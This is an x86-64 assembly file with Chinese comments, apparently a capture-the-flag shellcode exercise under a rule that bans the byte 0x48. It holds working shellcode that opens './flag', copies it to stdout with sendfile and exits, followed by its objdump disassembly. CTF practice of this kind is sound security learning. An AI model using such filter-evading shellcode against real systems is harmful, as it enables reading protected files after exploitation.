# 禁止字符H, 也就是0x48

.global _start
_start:
.intel_syntax noprefix
        xor al, al
        mov al, 2
        lea edi, [rip+flag]   # 不知道32位的能否被赋值指针
        xor esi, esi
        xor edx, edx
        syscall
        mov esi, eax
        mov al, 40
        xor edi, edi
        inc edi
        mov r10, 0x3e8
        syscall
        mov al, 60
        xor edi, edi
        syscall
flag:
        .string "./flag"

        0000000000401000 <_start>:
          401000:       30 c0                   xor    al,al
          401002:       b0 02                   mov    al,0x2
          401004:       8d 3d 1d 00 00 00       lea    edi,[rip+0x1d]        # 401027 <flag>
          40100a:       31 f6                   xor    esi,esi
          40100c:       31 d2                   xor    edx,edx
          40100e:       0f 05                   syscall
          401010:       89 c6                   mov    esi,eax
          401012:       b0 28                   mov    al,0x28
          401014:       31 ff                   xor    edi,edi
          401016:       ff c7                   inc    edi
          401018:       49 c7 c2 e8 03 00 00    mov    r10,0x3e8
          40101f:       0f 05                   syscall
          401021:       b0 3c                   mov    al,0x3c
          401023:       31 ff                   xor    edi,edi
          401025:       0f 05                   syscall

        0000000000401027 <flag>:
          401027:       2e 2f                   cs (bad)
          401029:       66 6c                   data16 ins BYTE PTR es:[rdi],dx
          40102b:       61                      (bad)
          40102c:       67                      addr32
